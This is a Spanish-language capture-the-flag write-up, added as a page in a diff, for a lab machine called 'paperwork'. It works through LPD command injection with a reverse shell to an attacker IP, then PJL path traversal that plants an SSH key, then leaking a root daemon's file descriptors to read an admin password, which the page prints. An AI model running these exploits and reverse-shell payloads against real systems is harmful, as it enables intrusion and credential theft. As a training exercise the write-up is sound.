+VALID_QUEUE = os.environ.get(<span style="color:#98c379;">"LPD_QUEUE"</span>)
+
+<span style="color:#c678dd;">class</span> <span style="color:#e5c07b;">LpdHandler</span>(threading.Thread):
+    <span style="color:#c678dd;">def</span> <span style="color:#61afef;">__init__</span>(self, sock, addr):
+        <span style="color:#61afef;">super</span>().__init__()
+        self.sock = sock
+        self.addr = addr
+        self.id = <span style="color:#98c379;">f"[lpd-{addr[1]}]"</span>
+
+    <span style="color:#c678dd;">def</span> <span style="color:#61afef;">run</span>(self):
+        <span style="color:#c678dd;">try</span>:
+            data = self.sock.recv(<span style="color:#d19a66;">1024</span>)
+            <span style="color:#c678dd;">if not</span> data: <span style="color:#c678dd;">return</span>
+            command = data[<span style="color:#d19a66;">0</span>]
+            <span style="color:#c678dd;">if</span> command == <span style="color:#d19a66;">2</span>:
+                self.handle_print_job(data)
+            <span style="color:#c678dd;">elif</span> command <span style="color:#c678dd;">in</span> (<span style="color:#d19a66;">3</span>, <span style="color:#d19a66;">4</span>):
+                self.sock.send(<span style="color:#98c379;">b"Archive_Printer is ready and printing.\n"</span>)
+        <span style="color:#c678dd;">except</span> Exception <span style="color:#c678dd;">as</span> e:
+            <span style="color:#61afef;">print</span>(<span style="color:#98c379;">f"{self.id} Error: {e}"</span>)
+        <span style="color:#c678dd;">finally</span>:
+            self.sock.close()
+
+    <span style="color:#c678dd;">def</span> <span style="color:#61afef;">handle_print_job</span>(self, data):
+        queue = data[<span style="color:#d19a66;">1</span>:].decode().strip()
+        <span style="color:#c678dd;">if</span> queue <span style="color:#c678dd;">not in</span> VALID_QUEUE:
+            <span style="color:#61afef;">print</span>(<span style="color:#98c379;">f"{self.id} Rejected: Invalid queue '{queue}'"</span>)
+            self.sock.send(<span style="color:#98c379;">b'\x01'</span>)
+            <span style="color:#c678dd;">return</span>
+
+        <span style="color:#61afef;">print</span>(<span style="color:#98c379;">f"{self.id} Accepted job for queue: {queue}"</span>)
+        <span style="color:#c678dd;">while</span> <span style="color:#d19a66;">True</span>:
+            chunk = self.sock.recv(<span style="color:#d19a66;">1024</span>)
+            <span style="color:#c678dd;">if not</span> chunk: <span style="color:#c678dd;">break</span>
+            subcommand = chunk[<span style="color:#d19a66;">0</span>]
+            self.sock.send(<span style="color:#98c379;">b'\x00'</span>)
+            parts = chunk[<span style="color:#d19a66;">1</span>:].decode(errors=<span style="color:#98c379;">'ignore'</span>).split()
+            <span style="color:#c678dd;">if not</span> parts: <span style="color:#c678dd;">continue</span>
+            size = <span style="color:#61afef;">int</span>(parts[<span style="color:#d19a66;">0</span>])
+            content = <span style="color:#98c379;">b""</span>
+            <span style="color:#c678dd;">while</span> <span style="color:#61afef;">len</span>(content) &lt; size:
+                content += self.sock.recv(size - <span style="color:#61afef;">len</span>(content) + <span style="color:#d19a66;">1</span>)
+            decoded_content = content.decode(errors=<span style="color:#98c379;">'ignore'</span>)
+            job_name = <span style="color:#98c379;">"Unknown"</span>
+            <span style="color:#c678dd;">for</span> line <span style="color:#c678dd;">in</span> decoded_content.split(<span style="color:#98c379;">'\n'</span>):
+                line = line.strip()
+                <span style="color:#c678dd;">if</span> line.startswith(<span style="color:#98c379;">'J'</span>):
+                    job_name = line[<span style="color:#d19a66;">1</span>:]
+                    <span style="color:#c678dd;">break</span>
+
+            <span style="color:#61afef;">print</span>(<span style="color:#98c379;">f"{self.id} Executing archive for: {job_name}"</span>)
+            subprocess.Popen(
+                <span style="color:#98c379;">f"echo 'Archive: {job_name}' &gt;&gt; /tmp/archive.log"</span>,
+                shell=<span style="color:#d19a66;">True</span>
+            )
+            self.sock.send(<span style="color:#98c379;">b'\x00'</span>)
+            self.sock.send(<span style="color:#98c379;">b'\x00'</span>)
+            <span style="color:#c678dd;">while</span> self.sock.recv(<span style="color:#d19a66;">4096</span>):
+                <span style="color:#c678dd;">pass</span>
+            <span style="color:#c678dd;">break</span></code></pre>
+
+                <h3>Identificando el Punto de Inyección</h3>
+                <p>La línea crítica es la llamada a <code>subprocess.Popen</code> al final de <code>handle_print_job</code>:</p>
+
+                <pre><code class="language-python">subprocess.Popen(
+    <span style="color:#98c379;">f"echo 'Archive: {job_name}' &gt;&gt; /tmp/archive.log"</span>,
+    shell=<span style="color:#d19a66;">True</span>
+)</code></pre>
+
+                <p>La variable <code>job_name</code> se interpola directamente en una cadena de comandos shell sin ninguna sanitización. Se trata de una inyección de comandos de manual. Trazando hacia atrás el origen de <code>job_name</code>:</p>
+
+                <pre><code class="language-plaintext">job_name
+  ← line[1:]
+    ← line empieza por 'J'
+      ← decoded_content.split('\n')
+        ← decoded_content = content.decode()
+          ← content leído del socket (size bytes)</code></pre>
+
+                <p>En resumen: controlamos completamente el contenido del "fichero de control" enviado por el socket, y cualquier línea que empiece por <code>J</code> se convierte en <code>job_name</code>, que luego aterriza sin escapar dentro de una cadena de shell.</p>
+
+                <p>La página web también nos da el nombre de la cola válida: <code>archive_intake</code>. Este valor corresponde a la comprobación de la variable de entorno <code>VALID_QUEUE</code> — sin enviar exactamente este nombre de cola, la conexión se rechaza de inmediato.</p>
+
+                <h3>Construyendo el Payload</h3>
+                <p>Un payload naïve como <code>J'; wget 10.10.15.128\n</code> produciría:</p>
+
+                <pre><code class="language-bash"><span style="color:#e5c07b;">echo</span> <span style="color:#98c379;">'Archive: '; wget 10.10.15.128</span> &gt;&gt; /tmp/archive.log</code></pre>
+
+                <p>Sin embargo, al probar localmente contra una copia del servidor, apareció un error de shell:</p>
+
+                <pre><code class="language-plaintext">/bin/sh: 1: Syntax error: Unterminated quoted string</code></pre>
+
+                <p>La comilla simple de cierre al final de la plantilla del <code>echo</code> quedaba sin emparejar tras la inyección, haciendo que el shell rechazase el comando completo. La solución es cerrar correctamente la cadena y añadir una comilla de cierre al final para que la plantilla exterior siga siendo sintácticamente válida:</p>
+
+                <pre><code class="language-python">control_file = <span style="color:#98c379;">b"J'; bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.15.128/443 0&gt;&amp;1\"'\n"</span></code></pre>
+
+                <p>Disponer del código fuente fue clave aquí — poder ejecutar el servidor localmente y depurar el error exacto ahorró mucho tiempo de prueba y error.</p>
+
+                <h2>Acceso Inicial — Inyección de Comandos vía Socket</h2>
+                <p>El script de explotación completo que habla el protocolo binario del servidor e inyecta la reverse shell es:</p>
+
+                <pre><code class="language-python"><span style="color:#c678dd;">import</span> socket
+
+s = socket.socket()
+s.connect((<span style="color:#98c379;">'paperwork.htb'</span>, <span style="color:#d19a66;">1515</span>))
+<span style="color:#61afef;">print</span>(<span style="color:#98c379;">"[*] Conectado al servidor"</span>)
+
+<span style="color:#5c6370;"># Comando 2: enviar trabajo de impresión con nombre de cola</span>
+payload = <span style="color:#98c379;">b'\x02archive_intake\n'</span>
+s.send(payload)
+<span style="color:#61afef;">print</span>(<span style="color:#98c379;">f"[&gt;] Enviado comando de cola: {payload!r}"</span>)
+
+ack = s.recv(<span style="color:#d19a66;">1</span>)
+<span style="color:#61afef;">print</span>(<span style="color:#98c379;">f"[&lt;] ACK cola: {ack!r} ({'OK' if ack == b'\\x00' else 'RECHAZADO'})"</span>)
+<span style="color:#c678dd;">if</span> ack != <span style="color:#98c379;">b'\x00'</span>:
+    <span style="color:#61afef;">print</span>(<span style="color:#98c379;">"[!] Servidor rechazó la cola, abortando"</span>)
+    s.close()
+    exit(<span style="color:#d19a66;">1</span>)
+
+<span style="color:#5c6370;"># Fichero de control con línea J inyectada</span>
+control_file = <span style="color:#98c379;">b"J'; bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.15.128/443 0&gt;&amp;1\"'\n"</span>
+size = <span style="color:#61afef;">len</span>(control_file)
+<span style="color:#61afef;">print</span>(<span style="color:#98c379;">f"[*] Fichero de control preparado ({size} bytes): {control_file!r}"</span>)
+
+<span style="color:#5c6370;"># Cabecera de subcomando: byte 0x02 + tamaño + nombre de fichero</span>
+subcommand = <span style="color:#98c379;">f'\x02{size} cfA001host\n'</span>.encode()
+s.send(subcommand)
+<span style="color:#61afef;">print</span>(<span style="color:#98c379;">f"[&gt;] Enviado subcomando: {subcommand!r}"</span>)
+
+ack = s.recv(<span style="color:#d19a66;">1</span>)
+<span style="color:#61afef;">print</span>(<span style="color:#98c379;">f"[&lt;] ACK subcomando: {ack!r} ({'OK' if ack == b'\\x00' else 'ERROR'})"</span>)
+
+<span style="color:#5c6370;"># Enviar el contenido</span>
+s.send(control_file)
+<span style="color:#61afef;">print</span>(<span style="color:#98c379;">"[&gt;] Enviado fichero de control"</span>)
+
+ack = s.recv(<span style="color:#d19a66;">1</span>)
+<span style="color:#61afef;">print</span>(<span style="color:#98c379;">f"[&lt;] ACK contenido: {ack!r} ({'OK' if ack == b'\\x00' else 'ERROR'})"</span>)
+
+<span style="color:#61afef;">print</span>(<span style="color:#98c379;">"[+] Hecho. Esperando shell..."</span>)
+s.close()</code></pre>
+
+                <p>Antes de enviar la reverse shell, verifico la inyección sustituyéndola por un simple <code>wget</code> y comprobando que mi servidor HTTP recibe la petición desde el objetivo. Una vez confirmado, pongo un listener con netcat y lanzo el payload de reverse shell:</p>
+
+                <pre><code class="language-bash"><span style="color:#e5c07b;">nc</span> -lvnp 443</code></pre>
+
+                <p>La shell llega como el usuario <code>lp</code>. Desde aquí comienzo la enumeración interna.</p>
+
+                <h2>Enumeración Interna</h2>
+                <p>Un vistazo a <code>/home</code> revela al usuario <code>archivist</code>. Compruebo los puertos TCP abiertos localmente:</p>
+
+                <pre><code class="language-plaintext">tcp  LISTEN  0  128  127.0.0.1:1337
+tcp  LISTEN  0  100  127.0.0.1:9100</code></pre>
+
+                <p>El puerto 1337 es el backend de la aplicación web nginx del puerto 80. El puerto 9100 es más interesante — revisando la lista de procesos:</p>
+
+                <pre><code class="language-plaintext">archivist  980  ...  /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ /home/archivist/printer/logs/commands.log</code></pre>
+
+                <p>El proceso corre como <code>archivist</code> desde su directorio home, sirviendo un servicio <code>jetdirect.py</code> en el puerto 9100. Un escaneo nmap interno lo confirma:</p>
+
+                <pre><code class="language-plaintext">PORT      STATE  SERVICE    VERSION
+9100/tcp  open   jetdirect?</code></pre>
+
+                <p>JetDirect es el protocolo de impresión raw de HP. Una de sus funcionalidades menos conocidas es PJL (Printer Job Language), que incluye comandos de sistema de ficheros como <code>FSDOWNLOAD</code> para escribir ficheros en el almacenamiento de la impresora. Como el servicio corre como <code>archivist</code> y su directorio de trabajo está dentro del home de ese usuario, esto abre una vía potencial para escribir una clave SSH.</p>
+
+                <h2>Movimiento Lateral — Escritura de Clave SSH vía JetDirect PJL</h2>
+                <p>Primero intento interactuar con el servicio usando PRET (<a href="https://github.com/RUB-NDS/PRET">https://github.com/RUB-NDS/PRET</a>), una herramienta específica para PJL, pero no da resultados útiles para leer ficheros. Sin embargo, dado que el servicio corre como <code>archivist</code> y procesa rutas relativas a su directorio de trabajo, un comando <code>@PJL FSDOWNLOAD</code> crafteado con un path traversal hacia <code>~/.ssh/authorized_keys</code> debería funcionar.</p>
+
+                <p>El script de explotación lee mi clave pública SSH local, la codifica en base64 y la envía por un socket raw utilizando el comando PJL <code>FSDOWNLOAD</code> con una secuencia de traversal de directorios:</p>
+
+                <pre><code class="language-python"><span style="color:#c678dd;">import</span> socket, base64
+
+key = <span style="color:#98c379;">"~/.ssh/kerssh.pub"</span>
+pub = <span style="color:#61afef;">open</span>(key, <span style="color:#98c379;">"rb"</span>).read().strip() + <span style="color:#98c379;">b"\n"</span>
+pub_b64 = base64.b64encode(pub).decode()
+
+payload = (
+    <span style="color:#98c379;">"import socket,base64\n"</span>
+    <span style="color:#98c379;">"pub=base64.b64decode('"</span> + pub_b64 + <span style="color:#98c379;">"')\n"</span>
+    <span style="color:#98c379;">"body=b'@PJL FSDOWNLOAD NAME=\"0:/../.ssh/authorized_keys\" SIZE=%d\\r\\n'%len(pub)+pub\n"</span>
+    <span style="color:#98c379;">"s=socket.socket();s.settimeout(5);s.connect(('127.0.0.1',9100))\n"</span>
+    <span style="color:#98c379;">"s.send(b'\\x1b%-12345X'+body+b'\\x1b%-12345X\\r\\n')\n"</span>
+    <span style="color:#98c379;">"try:\n s.recv(200)\nexcept Exception:pass\n"</span>
+    <span style="color:#98c379;">"s.close()\n"</span>
+)</code></pre>
+
+                <p>La secuencia <code>\x1b%-12345X</code> es la cabecera y pie estándar UEL (Universal Exit Language) de PJL que envuelve los comandos PJL. Tras ejecutar esto en el objetivo, puedo conectarme por SSH como <code>archivist</code>:</p>
+
+                <pre><code class="language-bash"><span style="color:#e5c07b;">ssh</span> -i ~/.ssh/kerssh archivist@paperwork.htb</code></pre>
+
+                <h2>Escalada de Privilegios — Filtración de FDs via SCM_RIGHTS en Socket Unix</h2>
+                <p>Ahora como <code>archivist</code>, busco vías hacia root. Revisando los procesos en ejecución:</p>
+
+                <pre><code class="language-plaintext">root  1490  ...  /usr/bin/python3 /usr/bin/paperwork-daemon</code></pre>
+
+                <p>Root ejecuta <code>paperwork-daemon</code>. Leo su código fuente:</p>
+
+                <pre><code class="language-python"><span style="color:#5c6370;">#!/usr/bin/python3</span>
+<span style="color:#c678dd;">import</span> socket, os, array, hashlib
+<span style="color:#c678dd;">import</span> zipfile
+<span style="color:#c678dd;">import</span> shutil
+
+<span style="color:#c678dd;">try</span>:
+    admin_fd = os.open(<span style="color:#98c379;">"/etc/paperwork/admin_pins.conf"</span>, os.O_RDONLY)
+<span style="color:#c678dd;">except</span> Exception:
+    os._exit(<span style="color:#d19a66;">1</span>)
+
+LOG_PATH = <span style="color:#98c379;">"/home/archivist/printer/logs/commands.log"</span>
+
+<span style="color:#c678dd;">def</span> <span style="color:#61afef;">get_admin_secret</span>():
+    data = os.pread(admin_fd, <span style="color:#d19a66;">1024</span>, <span style="color:#d19a66;">0</span>).decode().strip()
+    <span style="color:#c678dd;">if</span> <span style="color:#98c379;">"ADMIN_PASSWORD="</span> <span style="color:#c678dd;">in</span> data:
+        <span style="color:#c678dd;">return</span> data.split(<span style="color:#98c379;">"ADMIN_PASSWORD="</span>)[<span style="color:#d19a66;">1</span>].split(<span style="color:#98c379;">"\n"</span>)[<span style="color:#d19a66;">0</span>]
+    <span style="color:#c678dd;">return</span> data
+
+<span style="color:#c678dd;">def</span> <span style="color:#61afef;">scan_for_malice</span>():
+    <span style="color:#c678dd;">if not</span> os.path.exists(LOG_PATH):
+        <span style="color:#c678dd;">return False</span>
+    <span style="color:#c678dd;">with</span> <span style="color:#61afef;">open</span>(LOG_PATH, <span style="color:#98c379;">'r'</span>) <span style="color:#c678dd;">as</span> f:
+        content = f.read().upper()
+    <span style="color:#c678dd;">if</span> <span style="color:#61afef;">any</span>(trigger <span style="color:#c678dd;">in</span> content <span style="color:#c678dd;">for</span> trigger <span style="color:#c678dd;">in</span> [<span style="color:#98c379;">"FSQUERY"</span>, <span style="color:#98c379;">"FSUPLOAD"</span>, <span style="color:#98c379;">"FSDOWNLOAD"</span>]):
+        <span style="color:#c678dd;">return True</span>
+    <span style="color:#c678dd;">return False</span>
+
+<span style="color:#c678dd;">def</span> <span style="color:#61afef;">trigger_lockdown</span>(conn):
+    <span style="color:#c678dd;">try</span>:
+        log_fd = os.open(LOG_PATH, os.O_RDONLY)
+        evidence_bundle = array.array(<span style="color:#98c379;">"i"</span>, [log_fd, admin_fd])
+        msg = <span style="color:#98c379;">b"ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED."</span>
+        conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])
+        zip_path = <span style="color:#98c379;">"/root/quarantine/evidence.zip"</span>
+        <span style="color:#c678dd;">with</span> zipfile.ZipFile(zip_path, <span style="color:#98c379;">'w'</span>, zipfile.ZIP_DEFLATED) <span style="color:#c678dd;">as</span> zipf:
+            zipf.write(LOG_PATH, arcname=<span style="color:#98c379;">"commands.log"</span>)
+        <span style="color:#c678dd;">with</span> <span style="color:#61afef;">open</span>(LOG_PATH, <span style="color:#98c379;">'w'</span>) <span style="color:#c678dd;">as</span> f:
+            f.truncate(<span style="color:#d19a66;">0</span>)
+        os.close(log_fd)
+    <span style="color:#c678dd;">except</span>:
+        <span style="color:#c678dd;">pass</span>
+
+<span style="color:#c678dd;">def</span> <span style="color:#61afef;">main</span>():
+    socket_path = <span style="color:#98c379;">"/run/paperwork/mgmt.sock"</span>
+    <span style="color:#c678dd;">if</span> os.path.exists(socket_path): os.remove(socket_path)
+    <span style="color:#c678dd;">if not</span> os.path.exists(<span style="color:#98c379;">"/run/paperwork"</span>): os.makedirs(<span style="color:#98c379;">"/run/paperwork"</span>)
+    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+    s.bind(socket_path)
+    os.chmod(socket_path, <span style="color:#d19a66;">0o660</span>)
+    os.chown(socket_path, <span style="color:#d19a66;">0</span>, <span style="color:#d19a66;">1000</span>)
+    s.listen(<span style="color:#d19a66;">5</span>)
+    <span style="color:#c678dd;">while True</span>:
+        conn, _ = s.accept()
+        <span style="color:#c678dd;">if</span> scan_for_malice():
+            trigger_lockdown(conn)
+        <span style="color:#c678dd;">else</span>:
+            secret = get_admin_secret()
+            token = hashlib.sha256(<span style="color:#98c379;">f"SYSTEM_CLEAN:{secret}"</span>.encode()).hexdigest()
+            conn.sendall(<span style="color:#98c379;">f"STATUS: SYSTEM_CLEAN\nSIGNATURE: {token}\n"</span>.encode())
+        conn.close()
+
+<span style="color:#c678dd;">if</span> __name__ == <span style="color:#98c379;">"__main__"</span>:
+    main()</code></pre>
+
+                <h3>Entendiendo la Lógica del Daemon</h3>
+                <p>El daemon abre <code>/etc/paperwork/admin_pins.conf</code> al arrancar y mantiene su descriptor de fichero (<code>admin_fd</code>) abierto durante toda la vida del proceso. En cada conexión al socket Unix en <code>/run/paperwork/mgmt.sock</code>, comprueba si un fichero de log — <code>/home/archivist/printer/logs/commands.log</code> — contiene alguna de las cadenas <code>FSQUERY</code>, <code>FSUPLOAD</code> o <code>FSDOWNLOAD</code>.</p>
+
+                <p>Si se encuentran esas palabras clave, el daemon llama a <code>trigger_lockdown</code>, que transmite tanto <code>log_fd</code> como <code>admin_fd</code> al cliente conectado usando <code>sendmsg</code> con <code>SCM_RIGHTS</code>. Este es un mecanismo del kernel Linux para pasar descriptores de fichero abiertos a través de conexiones de socket Unix — el proceso receptor puede entonces leer desde esos descriptores como si él mismo hubiera abierto esos ficheros, independientemente de los permisos del sistema de ficheros.</p>
+
+                <p>De forma crítica, los permisos del socket son:</p>
+
+                <pre><code class="language-bash"><span style="color:#e5c07b;">ls</span> -lah /run/paperwork/mgmt.sock
+<span style="color:#98c379;">srw-rw---- 1 root archivist 0 ... /run/paperwork/mgmt.sock</span></code></pre>
+
+                <p>El socket pertenece al grupo <code>archivist</code> (GID 1000) con acceso de lectura y escritura para el grupo. Esto significa que <code>archivist</code> puede conectarse a él y recibir los descriptores de fichero reenviados — incluyendo el que apunta a <code>/etc/paperwork/admin_pins.conf</code>.</p>
+
+                <h3>Desencadenando el Lockdown</h3>
+                <p>El fichero de log en <code>/home/archivist/printer/logs/commands.log</code> es escribible por <code>archivist</code>. Simplemente escribo una de las palabras clave disparadoras:</p>
+
+                <pre><code class="language-bash"><span style="color:#e5c07b;">echo</span> <span style="color:#98c379;">"FSUPLOAD"</span> &gt;&gt; /home/archivist/printer/logs/commands.log</code></pre>
+
+                <p>Luego me conecto al socket con un script Python que recibe el mensaje <code>SCM_RIGHTS</code> y lee desde cada descriptor de fichero reenviado, imprimiendo el valor que aparezca tras <code>ADMIN_PASSWORD=</code>:</p>
+
+                <pre><code class="language-python"><span style="color:#c678dd;">import</span> socket, array, os
+
+SOCK = <span style="color:#98c379;">"/run/paperwork/mgmt.sock"</span>
+
+s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.connect(SOCK)
+
+fds = array.array(<span style="color:#98c379;">"i"</span>)
+msg, anc, flags, addr = s.recvmsg(<span style="color:#d19a66;">4096</span>, socket.CMSG_SPACE(<span style="color:#d19a66;">2</span> * fds.itemsize))
+
+<span style="color:#c678dd;">for</span> level, ctype, cdata <span style="color:#c678dd;">in</span> anc:
+    <span style="color:#c678dd;">if</span> level == socket.SOL_SOCKET <span style="color:#c678dd;">and</span> ctype == socket.SCM_RIGHTS:
+        cdata = cdata[:len(cdata) - (len(cdata) % fds.itemsize)]
+        fds.frombytes(cdata)
+
+<span style="color:#c678dd;">for</span> fd <span style="color:#c678dd;">in</span> fds:
+    <span style="color:#c678dd;">try</span>:
+        data = os.pread(fd, <span style="color:#d19a66;">4096</span>, <span style="color:#d19a66;">0</span>).decode(errors=<span style="color:#98c379;">"ignore"</span>)
+        <span style="color:#c678dd;">if</span> <span style="color:#98c379;">"ADMIN_PASSWORD="</span> <span style="color:#c678dd;">in</span> data:
+            <span style="color:#61afef;">print</span>(data.split(<span style="color:#98c379;">"ADMIN_PASSWORD="</span>)[<span style="color:#d19a66;">1</span>].split(<span style="color:#98c379;">"\n"</span>)[<span style="color:#d19a66;">0</span>].strip())
+    <span style="color:#c678dd;">except</span> Exception:
+        <span style="color:#c678dd;">pass</span>
+
+s.close()</code></pre>
+
+                <p>Al ejecutar este script, la contraseña de administrador se imprime directamente por stdout:</p>
+
+                <pre><code class="language-bash">archivist@paperwork:~$ python3 xd.py
+<span style="color:#90a959;">ApparelMortuaryCedar22</span></code></pre>
+
+                <p>Esta contraseña es también la contraseña de la cuenta root. Cambiar a root completa la máquina:</p>
+
+                <pre><code class="language-bash">archivist@paperwork:~$ <span style="color:#e5c07b;">su</span> root
+Password:
+root@paperwork:/home/archivist#</code></pre>
+            </div>
+
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
